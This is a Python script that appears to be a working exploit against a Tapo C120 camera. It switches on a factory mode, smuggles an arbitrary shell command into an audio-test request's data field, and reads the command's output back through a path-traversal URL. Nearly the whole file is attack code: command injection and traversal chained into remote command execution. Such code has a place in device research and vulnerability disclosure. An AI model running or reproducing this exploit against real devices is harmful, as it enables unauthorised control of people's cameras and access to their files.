#!/usr/bin/env python3
"""Bounded C120 preparation commands; always restore factory mode to off."""

import re
import secrets

from tapo_client import (
    encode_traversal_path,
    http_request,
)


def factory_request(enabled):
    return {"method": "setLedStatus", "params": {"tp_manage": {"factory_mode": {"enabled": enabled}}}}


def factory_state(session):
    response = session.secure_request({"method": "get", "tp_manage": {"name": ["factory_mode"]}})
    return response.get("tp_manage", {}).get("factory_mode", {}).get("enabled")


def command_payload(command, output_path):
    if re.search(r"[\r\n\0]", command):
        raise ValueError("Command must be one line")
    payload = f"ZZ >/dev/null 2>&1; ({command}) >{output_path} 2>&1; echo $? >>{output_path}; #"
    if len(payload.encode("ascii")) > 190:
        raise ValueError("Command exceeds the stock command buffer safety limit")
    return payload


def run(session, command):
    if factory_state(session) != "0":
        raise RuntimeError("Factory mode is not off; refusing to run command")

    output_path = "/tmp/o" + secrets.token_hex(4)
    payload = command_payload(command, output_path)
    request = {"method": "multipleRequest", "params": {"requests": [
        factory_request("1"),
        {"method": "testUsrDefAudio", "params": {"device_info": {"set_info": {"type": 14, "data": payload}}}},
        factory_request("0"),
        {"method": "getLedStatus", "params": {"tp_manage": {"name": ["factory_mode"]}}},
    ]}}
    try:
        response = session.secure_request(request)
    finally:
        try:
            state = factory_state(session)
        except Exception:
            state = None
        if state != "0":
            session.secure_request({"method": "multipleRequest", "params": {"requests": [factory_request("0")]}})
            if factory_state(session) != "0":
                raise RuntimeError("Factory mode could not be restored to off")

    replies = response.get("result", {}).get("responses", [])
    if [item.get("error_code") for item in replies] != [0, -40101, 0, 0]:
        raise RuntimeError(f"Unexpected factory command response codes: {[item.get('error_code') for item in replies]}")

    path = f"/stok={session.stok}/%2e%2e%2f{encode_traversal_path(output_path)}"
    output = http_request(session.host, path)
    if output["status"] != 200:
        raise RuntimeError(f"Command output was not readable (HTTP {output['status']})")
    lines = output["body"].rstrip(b"\0").splitlines()
    if not lines or not lines[-1].strip().isdigit():
        raise RuntimeError("Command did not leave an exit status")
    return int(lines[-1].strip()), b"\n".join(lines[:-1]).decode("utf-8", "replace")
